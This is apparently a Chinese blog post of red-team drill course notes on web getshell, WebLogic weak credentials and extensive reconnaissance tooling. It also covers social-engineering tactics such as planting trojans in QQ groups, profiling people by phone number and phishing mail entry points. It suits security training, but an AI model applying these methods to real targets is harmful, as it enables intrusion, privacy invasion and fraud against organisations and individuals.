<p>访问<a target="_blank" rel="noopener" href="http://your-ip/index.php%E5%8F%AF%E4%BB%A5%E6%B5%8B%E8%AF%95%E4%B8%8A%E4%BC%A0%E5%8A%9F%E8%83%BD%EF%BC%8C%E4%B8%8A%E4%BC%A0%E4%BB%A3%E7%A0%81%E4%B8%8D%E5%AD%98%E5%9C%A8%E6%BC%8F%E6%B4%9E%EF%BC%8C%E4%BD%86%E5%88%A9%E7%94%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8D%B3%E5%8F%AFgetshell%EF%BC%9A">http://your-ip/index.php可以测试上传功能，上传代码不存在漏洞，但利用解析漏洞即可getshell：</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706220825427.png" alt="image-20220706220825427"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706220836902.png" alt="image-20220706220836902"></p>
<h2 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h2><p>weblogic文件读取漏洞</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706221647758.png" alt="image-20220706221647758"></p>
<p>弱口令<br>环境启动后，访问<a target="_blank" rel="noopener" href="http://your-ip:7001/console%EF%BC%8C%E5%8D%B3%E4%B8%BAweblogic%E5%90%8E%E5%8F%B0%E3%80%82">http://your-ip:7001/console，即为weblogic后台。</a><br>本环境存在弱口令：weblogic   Oracle@123<br>weblogic常用弱口令：<a target="_blank" rel="noopener" href="http://cirt.net/passwords?criteria=weblogic">http://cirt.net/passwords?criteria=weblogic</a></p>
<h1 id="信息收集与外网打点"><a href="#信息收集与外网打点" class="headerlink" title="信息收集与外网打点"></a>信息收集与外网打点</h1><h2 id="作战方案规划"><a href="#作战方案规划" class="headerlink" title="作战方案规划"></a>作战方案规划</h2><p>关于红队</p>
<p>红队是一种全范围的多层攻击模拟，旨在衡量公司的人员和网络、应用程序和物理安全控制，用以抵御现实对手的攻击。在红队交战期间，攻击队员会制定攻击方案，以揭示潜在的物理、硬件、软件和人为漏洞。红队的参与也为坏的行为者和恶意内部人员提供了机会来破坏公司的系统和网络，或者损坏其数据。<br>渗透测试中只关注给定目标系统的漏洞，红队测试则完全不一样。红队在测试过程中关注的是如何规划一条攻击路径来达到目的。在整个红队测试过程中不一定要也不一定会发现目标组织的漏洞，只要能达到目的，任何形式的攻击手段都可以使用，包括但不限于web或者操作系统漏洞、社会工程学、物理渗透、攻击上下游合作供应商等。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707150710201.png" alt="image-20220707150710201"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707150734140.png" alt="image-20220707150734140"></p>
<p>攻防演练人员规划</p>
<p>在一般的攻防演习活动中所需的红队人员数为三人，三人分别是：队长、渗透师、横向师。红队人员都应涉及较为全面的技术领域，除此之外可以细分三人的技术领域和应有的能力<br>•队长：技术综合能力较强，应具备较好的团队协作能力、组织能力、应变能力；<br>•渗透师：前渗透能力较强，在演习过程中需能“稳、狠、准、快”的寻找到边界点并进行突破（打点）；<br>•横向师：后渗透能力较强，根据渗透师的打点结果进行梳理，横向渗透其他内网服务和主机，全面的评估内网的安全体系。</p>
<p>俗话说的好“三个臭皮匠顶一个诸葛亮”，红队评估这件事情从来都不是一个人的“战斗”，它需要团队协作共同完成。每个红队成员都有自己较为熟悉的技术领域，这也就导致了每个人所“打”的点和所“看”的面不同，要想全面的进行评估工作就需要协作平台将每个人的信息进行汇总便于每个人都能接触到“不同面”的信息。<br>协作平台的推荐<br>•Codimd - <a target="_blank" rel="noopener" href="https://github.com/hackmdio/codimd">https://github.com/hackmdio/codimd</a> （Markdown文档协作平台）<br>•<a target="_blank" rel="noopener" href="https://shimo.im/">https://shimo.im/</a> 石墨文档<br>•腾讯协同文档<br>•CobaltStrike - <a target="_blank" rel="noopener" href="https://www.cobaltstrike.com/">https://www.cobaltstrike.com</a> （后渗透团队协作平台）</p>
<p>攻击思路</p>
<p>首先，直接怼靶标系统肯定是很难进去的，而且很多靶标系统根本找不到，或者是非常难找到，只能在内网中访问，这就需要我们寻找突破口进入内网。而且目标这么多，一个团队的话，需要进行分工合作。刚开始，每人选择不同的目标进行突破，一旦找到突破口进入内网，则汇集团队之力一起打内网。打入内网之后，进行内网横向渗透，寻找目标靶机。打入内网通往靶标总的来说有三方面可以攻击：<br>•Web挖洞打点<br>•社工钓鱼<br>•供应链攻击<br>这三个攻击面，我们可以同时分配不同的人员同步进行，比较重要的是Web漏洞打点和社工钓鱼</p>
<h2 id="外-网-信-息-收-集"><a href="#外-网-信-息-收-集" class="headerlink" title="外 网 信 息 收 集"></a>外 网 信 息 收 集</h2><p><strong>外网信息收集概述</strong></p>
<p>拿到一个目标，不考虑钓鱼的情况下。如果正常从web入手，至少需要收集以下的信息。<br><strong>公司级别</strong></p>
<p>•公司的域名<br>•公司的子域名<br>•全资子公司（可能从下级单位打上去，但是光打了下级算不算分得看裁判和规则怎么评估）<br>•公司的ip信息（大公司可以直接跑C段）<br>一般经过上面的收集以后，我们能够获取到一系列的ip，域名信息。此时需要针对这些进行排除（比如说云上的资产等或者存在cdn的资产）</p>
<p>ip级别<br>当我们拿到了一系列的ip和域名以后，对于已经确定的ip，需要进行至少以下的信息收集<br>•ip是否为真实ip<br>•ip开启了哪些端口，可能存在哪些漏洞</p>
<p>用户级别<br>用户级别主要是涉及拿到一些用户的用户名等。便于进行暴力破解。<br>•github，google语法，官网，看官网邮箱格式，根据公司名字猜，<br>•还有公告里泄露人名，<br>•一些通用的如公司首字母+数字等。</p>
<p>对于web，至少需要收集框架，路径，登录接口，js中的敏感信息，网站中间件，服务器操作系统等。</p>
<p><strong>企业架构信息收集</strong></p>
<p>获取目标域名<br>•直接百度公司，看看有无官网，官网一般是主域名<br>•查看天眼查，企查查，域名备案等获取主域名<br>•利用whois查询，whois反查获取域名相关信息<br>•利用app查询公司的域名。<br>•利用股权穿刺图查看公司的子公司域名<br>•<a target="_blank" rel="noopener" href="http://whois.chinaz.com/">http://whois.chinaz.com/</a> //whois查询<br>•<a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/">https://beian.miit.gov.cn/</a> // 域名备案查询<br>•<a target="_blank" rel="noopener" href="https://www.qcc.com/">https://www.qcc.com/</a> //企查查<br>•<a target="_blank" rel="noopener" href="https://www.qixin.com/">https://www.qixin.com/</a> //启信宝<br>•<a target="_blank" rel="noopener" href="http://icp.chinaz.com/">http://icp.chinaz.com/</a> //站长工具<br>•<a target="_blank" rel="noopener" href="https://www.tianyancha.com/">https://www.tianyancha.com/</a> //天眼查<br>企查查、天眼查淘宝都有那种一天的会员。对于我们信息收集其实已经够用，个人更喜欢用企查查，因为它能一键导出域名，还可以直接查看企业关联的子公司，比较方便。</p>
<p><strong>根域名资产收集</strong></p>
<p>ICP备案信息进行收集<br>中华人民共和国境内提供非经营性互联网信息服务，应当依法履行备案手续。未经备案，不得在中华人民共和国境内从事经营性互联网信息服务。目前只要是企业在中国境内需要提供互联网服务，都必须通过ICP工商备案才能运行。而ICP备案信息属于公开纰漏的信息，可以在 ICP/IP地址/域名信息备案管理系统 (<a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/)%E8%BF%9B%E8%A1%8C%E6%9F%A5%E8%AF%A2%EF%BC%8C%E4%B8%80%E8%88%AC%E6%88%91%E4%BB%AC%E9%83%BD%E6%98%AF%E5%AF%B9%E4%BC%81%E4%B8%9A%E6%88%96%E8%80%85%E6%94%BF%E4%BC%81%E5%8D%95%E4%BD%8D%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%EF%BC%8C%E8%BF%99%E4%BA%9B%E5%9F%9F%E5%90%8D%E9%83%BD%E6%98%AF%E9%9C%80%E8%A6%81%E5%9C%A8%E8%AF%A5%E7%B3%BB%E7%BB%9F%E4%B8%AD%E8%BF%9B%E8%A1%8C%E5%A4%87%E6%A1%88%E7%AD%89%E7%BA%A7%E7%9A%84%E3%80%82">https://beian.miit.gov.cn/)进行查询，一般我们都是对企业或者政企单位进行渗透测试，这些域名都是需要在该系统中进行备案等级的。</a><br>•<a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/">https://beian.miit.gov.cn/</a></p>
<p>工商股权信息收集<br>目前国内所有的企业，无论是私营企业还是国有企业都需要进行工商登记后才能进行企业正常运营。国家在这方面数据是可以通过公开渠道进行查询的，可以通过国家企业信用信息公示系统(<a target="_blank" rel="noopener" href="http://www.gsxt.gov.cn/index.html)%E6%9F%A5%E8%AF%A2%E6%8C%87%E5%AE%9A%E4%BC%81%E4%B8%9A%E7%9A%84">http://www.gsxt.gov.cn/index.html)查询指定企业的</a><br>工商注册信息，国内也有一些企业通过爬虫/数据合作方式将企业相关的数据通过数据分析方法关联在一些，比如企查查、天眼查、启信宝等等，我们可以通过这些平台查询到目标企业旗下其他业务的子公司名称，通过子公司的ICP备案信息再进一步扩展其他的根域名数据。</p>
<p>Whois数据信息收集<br>每个域名的注册都必须对外公开Whois数据，但是现在很多域名商默认都会开启域名隐私保护，我们就需要借助一些数据平台查询域名历史的Whois信息来进行关联了，我们可以通过Whois网站<br>•<a target="_blank" rel="noopener" href="http://whois.chinaz.com/">http://whois.chinaz.com</a>   查询利用ICP备案信息进行收集 和工商股权信息收集 收集到的域名的历史Whois信息</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707154437339.png" alt="image-20220707154437339"></p>
<p>SSL证书扩展<br>SSL/TLS证书通常包含域名、子域名和邮件地址等信息，结合证书中的信息，可以更快速地定位到目标资产，获取到更多目标资产的相关信息。企业在申请证书的时候一般会将同类业务域名的申请成一张成熟，一方面是出于成本考虑，还有一方面也是方面对证书进行同一的管理。我们通过查询证书内容包含域名的证书信息可以发现证书的DNS Names中还会有其他的业务域名。<img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707154530965.png" alt="image-20220707154530965"></p>
<p><strong>企查查信息收集实战</strong></p>
<p>•<a target="_blank" rel="noopener" href="https://www.qcc.com/">https://www.qcc.com/</a> //企查查<br>主要查询的信息:<br>•一般我们的目标都有许多子公司,企查查可以在所属集团中查看该集团下子公司，并且可以导出。<br>•查看同电话企业基本都是子公司。<br>•查看股份穿透图，一般来说控股超过50%的子公司的漏洞SRC收录的可能性都比较大。<br>•查看企业下的app、小程序、还有品牌的资产，直接在搜索引擎里搜索品牌可能会有意想不到的收获。（找到一些平常收集不到的资产)</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707154618400.png" alt="image-20220707154618400"></p>
<p><strong>企业架构信息收集</strong></p>
<p>目标官网公示组织架构<br>基本上国企央企的集团总公司官网都会组织架构一栏，或者翻阅官方公示，以国家电网为例，在官网公示中可以看<br>到国家电网的组织架构<a target="_blank" rel="noopener" href="http://www.sgcc.com.cn/html/sgcc_main/col2017012538/column_2017012538_1.shtml">http://www.sgcc.com.cn/html/sgcc_main/col2017012538/column_2017012538_1.shtml</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707154704966.png" alt="image-20220707154704966"></p>
<p>微信公众号和小程序<br>可以通过搜狗来发现目标大概有哪些公众号，<br>•<a target="_blank" rel="noopener" href="https://weixin.sogou.com/weixin">https://weixin.sogou.com/weixin</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707154734551.png" alt="image-20220707154734551"></p>
<p>七麦数据是国内APP数据整合的比较全的一个平台<br>•<a target="_blank" rel="noopener" href="https://www.qimai.cn/">https://www.qimai.cn/</a> 七麦数据查询</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707154759546.png" alt="image-20220707154759546"></p>
<p>•<a target="_blank" rel="noopener" href="https://github.com/wgpsec/ENScan_GO">https://github.com/wgpsec/ENScan_GO</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707154845199.png" alt="image-20220707154845199"></p>
<p>当我们通过各种手段对挖掘的企业进行信息收集后，我们大致能得到以下有用的信息。<br>•主公司及分公司、子公司下所有归属的网站域名信息；<br>•主公司及分公司、子公司下所有的专利品牌和开发的一些独立系统。<br>•主公司及分公司、子公司下所有的app资产和微信小程序。之后我们需要对这些信息进行归纳和整理,比如哪些是该公司的主资产，哪些是边缘资产，哪些资产看上去比较冷门，我们是可以重点关注和进行深入挖掘的。</p>
<p><strong>子域名信息收集</strong></p>
<p>子域名，凡顶级域名前加前缀的都是该顶级域名的子域名，子域名根据技术的多少分为二级子域名，三级子域名，多级子域名。子域名是某个主域的二级域名或多级域名，在防御措施严密情况下无法直接拿下主域，那么就可以采用迂回战术拿下子域名。<br>•<a target="_blank" rel="noopener" href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a><br>•<a target="_blank" rel="noopener" href="https://github.com/knownsec/ksubdomain">https://github.com/knownsec/ksubdomain</a><br>•<a target="_blank" rel="noopener" href="https://github.com/timwhitez/rad-xray">https://github.com/timwhitez/rad-xray</a><br>•<a target="_blank" rel="noopener" href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a><br>•<a target="_blank" rel="noopener" href="https://github.com/projectdiscovery/subfinder">https://github.com/projectdiscovery/subfinder</a><br>•fofa/quake/hunter 等资产搜索引擎</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707154942262.png" alt="image-20220707154942262"></p>
<p>第三方网站查询：<br>•<a target="_blank" rel="noopener" href="http://tool.chinaz.com/subdomain">http://tool.chinaz.com/subdomain</a><br>•<a target="_blank" rel="noopener" href="https://dnsdumpster.com/">https://dnsdumpster.com</a></p>
<p>证书透明度公开日志枚举：<br>•<a target="_blank" rel="noopener" href="https://crt.sh/">https://crt.sh/</a><br>•<a target="_blank" rel="noopener" href="http://censys.io/">http://censys.io/</a><br>其他途径<br>•<a target="_blank" rel="noopener" href="https://phpinfo.me/domain">https://phpinfo.me/domain</a><br>•<a target="_blank" rel="noopener" href="http://dns.aizhan.com/">http://dns.aizhan.com</a><br>•<a target="_blank" rel="noopener" href="https://hackertarget.com/find-dns-host-records/">https://hackertarget.com/find-dns-host-records/</a><br>•<a target="_blank" rel="noopener" href="https://site.ip138.com/">https://site.ip138.com</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707155024003.png" alt="image-20220707155024003"></p>
<p><strong>IP信息收集</strong></p>
<p>域名转化为ip的工具，同时能够将C段整理出来。<br>•<a target="_blank" rel="noopener" href="https://github.com/EdgeSecurityTeam/Eeyes">https://github.com/EdgeSecurityTeam/Eeyes</a><br>之后可以尝试扫描一下c段，因为有ehole能够直接整理出重点资产，比较方便。推荐的扫描工具。<br>•<a target="_blank" rel="noopener" href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a><br>•<a target="_blank" rel="noopener" href="https://github.com/Adminisme/ServerScan">https://github.com/Adminisme/ServerScan</a><br>•<a target="_blank" rel="noopener" href="https://github.com/EdgeSecurityTeam/EHole">https://github.com/EdgeSecurityTeam/EHole</a><br>这里可能会存在一些cdn，需要真实ip的可能。</p>
<p><strong>真实ip</strong><br>•海外ping<br>•因为 CDN 的原因，国内的站用国外 ping，反之亦然，可能获取真实 IP。有些子域名可能由于成本的原因没有用 CDN，所以要尽可能的多收集子域名，从而有效判断真实 ip。<br>•zoomeye/fofa/shodan<br>•同上反查操作，能找出一批 IP，再进行鉴别</p>
<p>历史解析ip和 ip的历史解析域名<br>•一般来说，ip 和域名总有更换绑定的历史记录，在已知域名、子域名、ip 的情况下，把所有域名和 ip 进行历史解析查询，多用国外 dns。<br>•DNSDB：<a target="_blank" rel="noopener" href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a><br>•微步在线：<a target="_blank" rel="noopener" href="https://x.threatbook.cn/">https://x.threatbook.cn/</a><br>•Ipip.net：<a target="_blank" rel="noopener" href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a><br>旁站和C段<br>有一定防范意识的目标，一般都会将自己的 web 单独托管，如果有旁站或 C 段看起来比较奇怪，基本也可以认为不是真实 IP。</p>
<p>使用Eeyes对OneForAll收集到的subdomain数据进行处理，获取其中真实IP并整理成c段。<br>•<a target="_blank" rel="noopener" href="https://github.com/EdgeSecurityTeam/Eeyes">https://github.com/EdgeSecurityTeam/Eeyes</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707155202423.png" alt="image-20220707155202423"></p>
<p>同时cIPR可以将域名转为ip段权重，也可以做上述功能。<br>•<a target="_blank" rel="noopener" href="https://github.com/canc3s/cIPR">https://github.com/canc3s/cIPR</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707155225498.png" alt="image-20220707155225498"></p>
<p>端口扫描<br>当确定了目标大概的ip段后，可以先对ip的开放端口进行探测，一些特定服务可能开起在默认端口上，探测开放端口有利于快速收集目标资产，找到目标网站的其他功能站点。<br>•<a target="_blank" rel="noopener" href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a><br>•<a target="_blank" rel="noopener" href="https://github.com/Adminisme/ServerScan">https://github.com/Adminisme/ServerScan</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707155255703.png" alt="image-20220707155255703"></p>
<p>APP中的域名/IP：<br>在天眼查里面查到的企业关联信息，可以用这些企业信息在app商店里面搜索。也可以在官网的办公平台找找有无内部使用的app，如企业自研的办公软件。<br>•<a target="_blank" rel="noopener" href="https://www.qimai.cn/">https://www.qimai.cn/</a><br>•使用AppInfoScanner对拿到的APP进行信息收集。<br>•<a target="_blank" rel="noopener" href="https://github.com/kelvinBen/AppInfoScanner">https://github.com/kelvinBen/AppInfoScanner</a></p>
<p><strong>网络资产测绘信息收集实战</strong></p>
<p>目前网络上比较知名的网络空间检索平台有白帽汇的 fofa、360的 quake、<br>知道创宇的 zoomeye、安恒的 sumap、奇安信的 hunter、以及国外的 shodan。<br>•<a target="_blank" rel="noopener" href="https://fofa.info/">https://fofa.info/</a><br>•<a target="_blank" rel="noopener" href="https://www.zoomeye.org/">https://www.zoomeye.org/</a><br>•<a target="_blank" rel="noopener" href="https://quake.360.cn/quake/welcome#/">https://quake.360.cn/quake/welcome#/</a><br>•<a target="_blank" rel="noopener" href="https://hunter.qianxin.com/">https://hunter.qianxin.com/</a><br>常见的工具有 Fofa_Viewer、FofaX、Kunyu，其中 Fofa_Viewer 为图形化界面，使用友好，<br>•<a target="_blank" rel="noopener" href="https://github.com/wgpsec/fofa_viewer">https://github.com/wgpsec/fofa_viewer</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707155414174.png" alt="image-20220707155414174"></p>
<p>证书查询<br>证书内容其实就是一个文本内容，结合证书中的信息，可以更快速地定位到目标资<br>产，获取到更多目标资产的相关信息。<br>Fofa</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707155436901.png" alt="image-20220707155436901"></p>
<p>网站备案<br>国内除了 zoomeye，基本都有对备案有简单的支持,可以对备案号进行搜索，<img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707155457938.png" alt="image-20220707155457938"></p>
<p>使用Fofa搜集资产：<br>•title=”XX市XX医院”<br>•title=”XX市” &amp;&amp; title=”XX医院”<br>•title=”XX市XX医院” &amp;&amp; country=”CN” &amp;&amp; region!=”HK”</p>
<p>•title=”登陆” &amp;&amp; “XX市” &amp;&amp; “XX医院” &amp;&amp; country=”CN” &amp;&amp; region!=”HK”<br>•title=”管理” &amp;&amp; “XX市” &amp;&amp; “XX医院” &amp;&amp; country=”CN” &amp;&amp; region!=”HK”<br>•title=”系统” &amp;&amp; “XX市” &amp;&amp; “XX医院” &amp;&amp; country=”CN” &amp;&amp; region!=”HK”<br>•title=”测试” &amp;&amp; “XX市” &amp;&amp; “XX医院” &amp;&amp; country=”CN” &amp;&amp; region!=”HK”<br>•等等···</p>
<p>使用Hunter搜集资产：<br>hunter除了体验上的优化外，比较吸引人的是备案关联信息的查询，这个对于国内的一些应用场景很适用, hunter针对各家的搜索语法都有一定的兼容性</p>
<p>•<a target="_blank" rel="noopener" href="https://github.com/wgpsec/fofa_viewer">https://github.com/wgpsec/fofa_viewer</a><br>•多标签式查询结果展示<br>•丰富的右键菜单<br>•支持查询结果导出为excel文件<br>•支持手动修改查询最大条数，方便非高级会员使用(修改config.properties中的maxSize即可)<br>•支持证书转换 将证书序列填写入启动页框内可转换，再使用cert=”计算出来的值” 语法进行查询 具体例子<br>•支持输入智能提示<br>•支持fofa的一键排除干扰（蜜罐）功能。（注：需要高级会员，使用时会在tab页标记(*)）<br>•支持Fid查询（注：需要高级会员，查询时需要勾选）<br>•支持full查询(查询全部数据)<br>•显示fofa官网的查询语法</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707155620822.png" alt="image-20220707155620822"></p>
<p><strong>web信息收集</strong></p>
<p>指纹识别<br>•<a target="_blank" rel="noopener" href="https://github.com/zhzyker/dismap">https://github.com/zhzyker/dismap</a><br>•<a target="_blank" rel="noopener" href="https://github.com/s7ckTeam/Glass">https://github.com/s7ckTeam/Glass</a><br>•<a target="_blank" rel="noopener" href="https://github.com/EdgeSecurityTeam/EHole">https://github.com/EdgeSecurityTeam/EHole</a><br>•<a target="_blank" rel="noopener" href="https://github.com/0x727/ObserverWard_0x727">https://github.com/0x727/ObserverWard_0x727</a><br>•wappalyzer<br>•Goby</p>
<p>利用web的js里面可能会泄露web框架的相关信息，或者根据网站的图标，错误页面，下方的开发公司等去确定网站可能采用了什么框架。</p>
<p>在线的网站查询CMS<br>•BugScaner: <a target="_blank" rel="noopener" href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a><br>•潮汐指纹：<a target="_blank" rel="noopener" href="http://finger.tidesec.net/">http://finger.tidesec.net/</a><br>•WhatWeb: <a target="_blank" rel="noopener" href="https://whatweb.net/">https://whatweb.net/</a><br>•云悉指纹: <a target="_blank" rel="noopener" href="http://www.yunsee.cn/finger.html">http://www.yunsee.cn/finger.html</a><br>•<a target="_blank" rel="noopener" href="https://fp.shuziguanxing.com/#/">https://fp.shuziguanxing.com/#/</a><br>手工识别<br>•根据HTTP响应头判断，重点关注X-Powered-By、cookie等字段<br>•根据HTML 特征，重点关注 body、title、meta等标签的内容和属性。<br>•根据特殊的class判断。HTML 中存在特定 class 属性的某些 div 标签，如<code>&lt;body class=&quot;ke-content&quot;&gt;</code></p>
<p>敏感目录/文件收集<br>对目标网站做目录扫描。在web渗透中，探测Web目录结构和隐藏的敏感文件是一个十分重要的环节，从中可以获取网站的后台管理页面、文件上传界面、robots.txt，甚至可能扫描出备份文件从而得到网站的源代码。<br>•dirsearch<br>•小米范系列工具<br>•<a target="_blank" rel="noopener" href="https://github.com/broken5/bscan">https://github.com/broken5/bscan</a><br>•Dirmap<br>•小米范系列工具<br>burp爆破自定义的字典 //需要平时收集或者再github上找字典（主要还是可能有些网站他有自己的路径格式，工具不一定能跑出来）<br>扫描的结果都在于字典：<a target="_blank" rel="noopener" href="https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a></p>
<p>后台收集<br>这里专门把后台收集提出来，是因为后台并不是说路径扫完了没了就没有了。有可能字典不包含。碰到这种情况，可以尝试以下方法:<br>•可以去搜一下有没有相同的框架说明文档看看后台地址。<br>•根据他网站文件的命名格式去看一下有没有可能重名。<br>•在网页上看看有没有暴露出后台的接口<br>•在js中搜一下admin,system等关键字看看能不能拼接处后台地址。<br>•根据url地址，直接把user改为admin等等。</p>
<p>敏感文件收集<br>查看开发者工具中js，然后对于一些js文件搜索password username等关键字<br>•<a target="_blank" rel="noopener" href="https://github.com/m4ll0k/SecretFinder">https://github.com/m4ll0k/SecretFinder</a><br>•<a target="_blank" rel="noopener" href="https://github.com/Threezh1/JSFinder">https://github.com/Threezh1/JSFinder</a><br>•<a target="_blank" rel="noopener" href="https://github.com/rtcatc/Packer-Fuzzer">https://github.com/rtcatc/Packer-Fuzzer</a><br>•<a target="_blank" rel="noopener" href="https://github.com/p1g3/JSINFO-SCAN">https://github.com/p1g3/JSINFO-SCAN</a><br>网站内容的敏感数据<br>这种对有些ZF很有用。经常会碰到邮箱账号密码都写在主页里的。所以对于一些文章啊，可以浏览一些。说不定也能看到一些收购计划之类的，扩大我们的攻击面。<br>•策划书<br>•默认密码<br>•通讯录</p>
<p><strong>社交平台</strong></p>
<p>QQ群<br>•在QQ群中搜索目标关键字，加群即可，然后根据群内聊天内容，适当调整木马名称上传至群共享，上线率极高。<br>贴吧<br>•搜索公司名，重点关注关键字，如学校目标就在贴吧内搜索学号等<br>脉脉<br>•网页版直接搜索xxx公司，然后查看人脉即可获取员工基本信息（可能需要会员）<br>•移动版直接在首页搜索xxx公司，然后点击查看全部员工（需要会员）<br>•移动版搜索公司名称时会弹出该公司的相关内容，可能会出现子公司名称，可以记录一下</p>
<p><strong>网盘搜集</strong></p>
<p>网盘搜索对普通企业，高校等目标发现敏感信息的可能更大一些，下面列几个查询网站<br>•<a target="_blank" rel="noopener" href="http://wp.soshoulu.com/">http://wp.soshoulu.com/</a><br>常用关键字：奖学金、名单等等，现在百度网盘对数据泄漏的防护越来越好了，不能像以前一样随便一搜就能有很多数据了。</p>
<p>搜索引擎是攻击者收集组织相关信息的最常用工具。由于google、baidu、bing等搜索引擎的爬虫十分强大，且都支持统一的高级搜索语法，所以可以收集到很多有用的信息。而网盘作为一个共享文件的工具，也是信息泄露的重灾区。这里就通过搜索引擎+网盘的邮箱收集思路：site:vdisk.weibo.com intext:阿里巴巴|通讯录，搜索到了相应组织的通讯录信息，其中也包含大量的邮箱信息。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707155954360.png" alt="image-20220707155954360"></p>
<p><strong>代码泄露</strong></p>
<p>github是目前世界上最大、最流行的代码仓库。作为一个代码仓库，github同时也是敏感信息泄露的重灾区。攻击者可以使用github搜索语法搜索特定组织的邮箱信息。如可以使用github关键词：email baidu.com搜索在github上的baidu.com的邮箱信息。</p>
<p>在代码共享平台上时常有代码泄漏，并且代码中时常包含服务器、数据库的地址帐号密码等敏感信息。在对目标网站测试时，经常会看到网站报错，从错误提示的包名中可以看到这是哪家公司开发的代码，然后再对应包名去github/gitee上搜索有没有这家公司的开发、运维人员存在信息泄漏。当然也会有些目标企业有自己的IT团队，所以在github/gitee搜索目标名字有时也是有收获的。<br>github信息泄露监控<br>•<a target="_blank" rel="noopener" href="https://github.com/0xbug/Hawkeye">https://github.com/0xbug/Hawkeye</a><br>•<a target="_blank" rel="noopener" href="https://github.com/MiSecurity/x-patrol">https://github.com/MiSecurity/x-patrol</a><br>•<a target="_blank" rel="noopener" href="https://github.com/VKSRC/Github-Monitor">https://github.com/VKSRC/Github-Monitor</a></p>
<p><strong>社工信息</strong></p>
<p>知道 QQ<br>•通过 QQ 邮箱和 QQ 号搜索支付宝、淘宝账号等其他可能的常用平台<br>•去腾讯 \ 新浪微博搜索<br>•通过微信搜索<br>•查看 QQ 空间 \ 相册 \ 地区 \ 星座 \ 生日 \ 昵称 (后续构建字典以及跨平台搜集)<br>•通过说说、留言、日志找到其好友<br>•加 QQ 钓鱼 \ 共同好友 \ 可能认识的人</p>
<p>知道手机号<br>•搜索 QQ、微信、钉钉等社交账号<br>•在比较火的一些 APP 和网站上注册或忘记密码来判断是否注册过账<br>•查询支付宝、QQ 交易账号，尝试输入常见姓氏获取名字 (转账到该手机号，会提示输入姓氏验证)<br>•通过对方的职业、兴趣找到该领域知名度较高的社交网站反查<br>•根据在 QQ 空间、朋友圈等动态用百度识图识别照片<br>•在微博、ins、Twitter、fb、百度贴吧搜索相近关键字，按地域、年龄、男女、用户名等筛选</p>
<p>留意社交动态<br>•使用什么客户端 iPhone Android 还是浏览器<br>•针对客户端预先制定 exploit<br>•注意每一条链接 / 图片 / 视频链接可能包含用户 ID<br>•图片可能包含水印，exif 可能会有 GPS 定位和手机类型，图片内容特征<br>•视频也有可能有水印暴露社交账号 ID, 拍摄地点<br>•从最早发布的动态看起，会有很大收获<br>•一般得到一个账号的密码就相当于得到了其他账号的密码<br>•一般人不同账号的用户名都是相同或相近的<br>•一般人的社交账号头像用的都是一样的<br>•尝试破解社保、公积金账号、身份证号（出生地、生日、星座、派出所代码）</p>
<p><strong>邮箱钓鱼</strong></p>
<p>寻找目标开放的邮件服务端口和web端邮箱入口:<br>•通过扫描c段找到入口：<br>我们拿到网站的时候，首先要先从MX记录域名找到他的真实ip地址（某些目标可能是的是第三方邮件服务器，目标这种情况mx记录没啥用了）；当我们拿到目标网站的时候，首先要先从MX记录域名找到他的真实ip地址（某些目标可能是第三方邮件服务器，这种情况mx记录没啥用了）；然后针对这个ip地址的c段进行扫描（25、109、110、143、465、995、993端口），一般情况下都很容易找到目标的邮件服务器入口</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707160230326.png" alt="image-20220707160230326"></p>
<p>通过扫描子域名的的方式找到邮件入口<br>这里扫描子域名的工具有很多，如Sublist3r、TeeMO、LangSrcCurise、挖掘机等不一一举例。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707160310287.png" alt="image-20220707160310287"></p>
